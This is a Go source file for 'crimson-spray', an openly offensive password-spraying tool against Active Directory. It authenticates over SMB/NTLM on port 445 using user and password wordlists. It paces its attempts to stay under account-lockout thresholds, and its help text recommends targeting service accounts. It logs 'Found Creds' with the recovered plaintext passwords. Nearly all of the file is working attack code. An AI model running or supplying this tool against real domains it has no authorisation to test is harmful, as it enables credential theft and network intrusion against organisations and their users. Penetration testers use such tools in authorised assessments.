package main

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/signal"
	"strings"
	"sync"
	"time"

	"github.com/akamensky/argparse"
	"github.com/hirochachacha/go-smb2"
)

func main() {
	parser := argparse.NewParser("crimson-spray", "(v.0.2.0) A lockout aware password sprayer for Active Directory. Please enter the raw net accounts /domain variables for best results. It is also advisable to use this against service accounts.")
	var userFilePathArg = parser.String("u", "username-file", &argparse.Options{Required: true, Help: "(Required) File of users separated by newlines"})
	var passFilePathArg = parser.String("p", "password-file", &argparse.Options{Required: true, Help: "(Required) File of passwords seperated by newlines. A good wordlist generator can be found at https://weakpass.com/generate"})
	var domainArg = parser.String("d", "domain", &argparse.Options{Required: true, Help: "(Required) Domain of user "})
	var targetArg = parser.String("t", "target", &argparse.Options{Required: true, Help: "(Required) IP or Hostname of target to authenticate against"})
	var lockThresh = parser.Int("a", "Lockout-Attempt-Threshold", &argparse.Options{Required: true, Help: "(Required) Number of passwords attempts before lockout. Attempts will not exceed this amount - 1."})
	var lockThreshTime = parser.Int("l", "Lockout-Attempt-Threshold-Timer", &argparse.Options{Required: true, Help: "(Required) Duration of time in minutes for the threshold timer to elapse. An addition minute is added"})
	var lockTime = parser.Int("r", "Lockout-Timer", &argparse.Options{Required: true, Help: "(Required) Duration of time in minutes for an locked out account to become unlocked. If account lockout is detected, program will wait this time + 1 minute.\n"})
	var bypassWait = parser.Flag("", "bypass-wait", &argparse.Options{Help: "Bypass initial lock threshold reset period"})
	var noHeaderArg = parser.Flag("", "no-stats", &argparse.Options{Default: false, Help: "Suppress stats banner"})
	var verboseArg = parser.Int("v", "verbose", &argparse.Options{Default: 2, Help: "0 - Reserved | 1 - Success Messages | 2 - Lockout , Pause , and Success Messages | 3 - Attempts, Pause, Lockout and Success Messages | 4 - Debug Messages"})
	var logOutputFileArg = parser.String("o", "logfile", &argparse.Options{Default: "", Help: "If defined, output log to file"})
	var noConsole = parser.Flag("", "no-console", &argparse.Options{Help: "No console output"})
	var maxThreadsArg = parser.Int("T","max-threads",&argparse.Options{Help: "Max number threads to user. 1 per user. Default is the user list length. 0 is unlimited",Default: 0})
	err := parser.Parse(os.Args)

	var logfile *os.File
	var multiwriter io.Writer
	var consoleOut *os.File

	if *noConsole {
		consoleOut = nil
	} else {
		consoleOut = os.Stdout
	}

	//Define if output should be to logfile, stout or both
	if *logOutputFileArg != "" {
		logfile, err := os.OpenFile(*logOutputFileArg, os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
		if err != nil {
			log.Fatalf("error opening/creating logfile: %v", err)
		}
		defer logfile.Close()
		if consoleOut != nil {
			multiwriter = io.MultiWriter(logfile, consoleOut)
		} else {
			multiwriter = io.MultiWriter(logfile)
		}
		log.SetOutput(multiwriter)
	} else {
		log.SetOutput(consoleOut)
	}

	// Catch signal cancel and run cleanup scripts
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt)
	go func() {
		for sig := range c {
			os.Exit(cleanUpScript(sig, logfile))
		}
	}()

	// Print Usage and exit
	if err != nil {
		fmt.Println(parser.Usage(err))
		os.Exit(1)
	}

	//Check for no verbose or no stats page
	if !*noHeaderArg && !*noConsole {
		preRunStats(*userFilePathArg, *passFilePathArg, *domainArg, *targetArg, *lockThresh, *lockThreshTime, *lockTime, *verboseArg,*maxThreadsArg)
	}

	if *bypassWait != true {
		log.Printf("Waiting inital lockout reset threshold... %d mins (You can bypass this with --bypass-wait)", *lockThreshTime)
		time.Sleep(time.Duration(*lockThreshTime) * time.Minute)
	}

	log.Printf("Starting Spray.....\n")
	multiSpray(*userFilePathArg, *passFilePathArg, *domainArg, *targetArg, *lockThresh, *lockThreshTime, *lockTime, *verboseArg,*maxThreadsArg)
}

func preRunStats(usernamePath string, passwordPath string, domain string, targetIP string, lockoutThreshold int, lockoutThresholdTimer int, lockoutTimer int, verbose int,maxThreads int) {

	/*
	Max time is going to be bananas if we include single threads.
	Single user guess:
	(Number of users / threads) * ((PasswordListLength / LockoutAttemptThreshold) * LockoutThresholdTimer )
	(100 users / 4 threads) * ((200 passwords / 9 Password Attempts before AttemptThreshold) * 15 min before lockout threshold is reset)

	PasswordListLen / AttemptsBeforeLockout = roundsOfAttemptsForSingleUser
	100 / 5 = 20 rounds of lockouts

	LockoutThresholdTimer * Number of Lockouts = numberOfMin (Number of mins for a single thread to complete entirepassword list if no lockouts and no sucesses occur.)
	15 mins * 20 rounds = 300mins



	 */
	userListLen := len(readFile(usernamePath))
	if maxThreads == 0 || maxThreads > userListLen {
		maxThreads = userListLen
	}
	numberOfThreads := userListLen / maxThreads
	passwordListLen := len(readFile(passwordPath))
	numberOfAttemptsPerRound := passwordListLen / (lockoutThreshold - 1)
	estimatedMaxTimePerThread := numberOfAttemptsPerRound * (lockoutThresholdTimer + 1)
	estimatedMaxTimeTotal := numberOfThreads * estimatedMaxTimePerThread




	timeLongForm := time.Duration(estimatedMaxTimeTotal) * time.Minute
	var verboseDetail string
	switch verbose {
	case 1:
		verboseDetail = "1 - Success Messages Only"
	case 2:
		verboseDetail = "2 - Pauses, Lockout and Success Messages"
	case 3:
		verboseDetail = "3 - Attempts, Pause, Lockout and Success Messages"
	case 4:
		verboseDetail = "4 - Debug Messages"

	}
	fmt.Println()
	fmt.Println("crimson-spray v0.2.0")
	fmt.Printf("Imported Users: %d\n", userListLen)
	fmt.Printf("Imported Passwords: %d\n", passwordListLen)
	fmt.Println()
	fmt.Printf("Target Domain: %s\n", domain)
	fmt.Printf("Target Host: %s\n", targetIP)
	fmt.Println()
	fmt.Printf("Lockout Attempt Threshold: %d \n", lockoutThreshold)
	fmt.Printf("Lockout Threshold Reset: %s \n", time.Duration(lockoutThresholdTimer)*time.Minute)
	fmt.Printf("Lockout Timer: %s \n\n", time.Duration(lockoutTimer)*time.Minute)
	fmt.Printf("Max number of Threads: %d \n", maxThreads)
	fmt.Printf("Estimated Max Completion Time (if no lockouts or sucesses occurs): %s\n", timeLongForm)
	fmt.Println()
	fmt.Printf("Verbose Level: %s\n\n", verboseDetail)
	/*
		UserList will not matter if all accounts are tested at once.
		PasswordListLen / lockoutThreshold = roundsOfAttempts
		lockoutThresholdTimer * roundOfAttempt = Estimated max time if no lockouts occur
	*/
}

func singleUserSpray(usernamePath string, passwordPath string, domain string, targetIP string, lockoutThreshold int, lockoutThresholdTimer int64, verbose int) {
	userList := readFile(usernamePath)
	passwordList := readFile(passwordPath)
	resetTimerDuration := lockoutThresholdTimer + 1
	attemptThreshold := lockoutThreshold - 1
	currentPasswordIndex := 0
	for _, users := range userList {
		trimUser := strings.TrimSpace(users)
		for currentPasswordIndex < len(passwordList) {
			result := 4
			for i := 0; i < attemptThreshold; i++ {
				passwordToAttempt := passwordList[currentPasswordIndex+i]
				trimPasswordToAttempt := strings.TrimSpace(passwordToAttempt)
				result = testCred(trimUser, trimPasswordToAttempt, domain, targetIP, verbose, currentPasswordIndex)
				if result == 0 {
					break
				} else if result == 2 {
					log.Printf("User account %s is locked out.\n", users)
					break //will reattempt password before incrementing the loop.
				}
				currentPasswordIndex++
			}
			if result == 0 {
				break
			}
			log.Printf("Sleeping for %d mins\n", resetTimerDuration)
			time.Sleep(time.Duration(resetTimerDuration) * time.Minute)

		}
	}

}

func multiSpray(usernamePath string, passwordPath string, domain string, targetIP string, lockoutThreshold int, lockoutThresholdTimer int, lockoutTimer int, verbose int,maxThreads int) {
	userList := readFile(usernamePath)
	passwordList := readFile(passwordPath)
	if maxThreads == 0 || maxThreads > len(userList) {
		maxThreads = len(userList)
	}
	guard := make(chan struct{},maxThreads) // Max Thread Struct
	var wg sync.WaitGroup
	for x := range userList {
		guard <- struct{}{} //Will wait until there is a free position to add another thread to guard
		wg.Add(1)
		userUser := userList[x]
		//UserSpray(y, passwordPath, domain, targetIP, lockoutThreshold, lockoutThresholdTimer, lockoutTimer)
		go func() {
			defer wg.Done()
			UserSpray(userUser, passwordList, domain, targetIP, lockoutThreshold, lockoutThresholdTimer, lockoutTimer, verbose)
			<-guard
		}()
	}
	wg.Wait()
	log.Println("Crimson Spray Completed")
}

func UserSpray(
	username string,
	passwordSlice []string,
	domain string, targetIP string,
	lockoutThreshold int,
	lockoutThresholdTimer int,
	lockoutTimer int,
	verbose int) string {
	resetTimerDuration := lockoutThresholdTimer + 1
	attemptThreshold := lockoutThreshold - 2
	currentPasswordIndex := 0
	passwordListLen := len(passwordSlice) - 1
	for currentPasswordIndex < passwordListLen {
		result := 4 //
		for i := 0; i <= attemptThreshold; i++ {
			passwordToAttempt := passwordSlice[currentPasswordIndex]
			result = testCred(username, passwordToAttempt, domain, targetIP, verbose, currentPasswordIndex)
			if result == 0 {
				break
			} else if result == 2 {
				if verbose >= 2 {
					log.Printf("User account %s is locked out. Lockout out ends in %d mintues\n", username, lockoutTimer+1)
				}
				time.Sleep(time.Duration(lockoutTimer+1) * time.Minute)
			}
			currentPasswordIndex++
			if currentPasswordIndex == passwordListLen {
				break
			}
		}
		if result == 0 {
			break
		}
		if verbose >= 2 {
			log.Printf("Threshold for %s resets in %d mins\n", username, resetTimerDuration)
		}
		time.Sleep(time.Duration(resetTimerDuration) * time.Minute)
	}
	return fmt.Sprintf("Done user %s", username)
}

func testCred(name string, passwordGuess string, domainDst string, ip string, verbose int, currentAttempt int) int {
	/* Return Values
	0 - Log in successful
	1 - Log in failed
	2 - Specified account is locked out
	3 - Reserved
	4 - Default first loop. This should never be returned
	*/
	dstServer := fmt.Sprintf("%s:445", ip)
	if verbose >= 4 {
		log.Printf("(%s Thread %d) Attempting to connect to %s", name, currentAttempt,dstServer,)
	}
	conn, err := net.Dial("tcp", dstServer)
	if err != nil {
		panic(err)
	}
	defer conn.Close()
	if verbose >= 4 {
		log.Printf("(%s Thread %d) Connected to %s",  name, currentAttempt,dstServer,)
		log.Printf("(%s Thread %d) Attempting authentication with %s\\%s:%s @ %s",name,currentAttempt, domainDst, name, passwordGuess, dstServer)
	}
	d := &smb2.Dialer{
		Initiator: &smb2.NTLMInitiator{
			User:     name,
			Password: passwordGuess,
			Domain:   domainDst,
		},
	}
	_, err = d.Dial(conn)
	if err != nil {
		if verbose >= 4 {
			log.Printf("(%s Thread %d),%s",name,currentAttempt,err.Error())
		}
		if strings.Contains(err.Error(), "automatically locked because too many invalid logon attempts") {
			return 2
		} else {
			if verbose >= 3 {
				log.Printf("(%s Thread %d) Failed %s\\%s:%s\n",name,currentAttempt, domainDst, name, passwordGuess)
			}
			return 1
		}
	} else {
		if verbose >= 1 {
			log.Printf("(%s Thread %d) !!!Found Creds (  %s\\%s:%s  )!!!\n",name,currentAttempt, domainDst, name, passwordGuess)
		}
		return 0
	}
}

func sannityCheckIP(ip string) bool {
	log.Printf("Testing connection to %s\n", ip)
	dstServer := fmt.Sprintf("%s:445", ip)
	_, err := net.Dial("tcp", dstServer)
	if err != nil {
		return false
	} else {
		return true
	}
}

func readFile(filepath string) []string {
	fileBytes, err := os.Open(filepath)
	if err != nil {
		log.Fatalf("Failed to open %s", filepath)
	}
	scanner := bufio.NewScanner(fileBytes)
	scanner.Split(bufio.ScanLines)
	var entries []string
	for scanner.Scan() {
		entries = append(entries, scanner.Text())
	}
	return entries
}

func cleanUpScript(signal2 os.Signal, logfile *os.File) int {
	log.Printf("%s was called\n", signal2)
	log.Println("Cleanup script ran")
	logfile.Close()
	return 1
}

/*
Verbose levels:
0 - No output
1 - Success Only
2 - Lockout Time, Pause Time, Success
3 - All attempts and Timers and Success
4 - Debug
*/
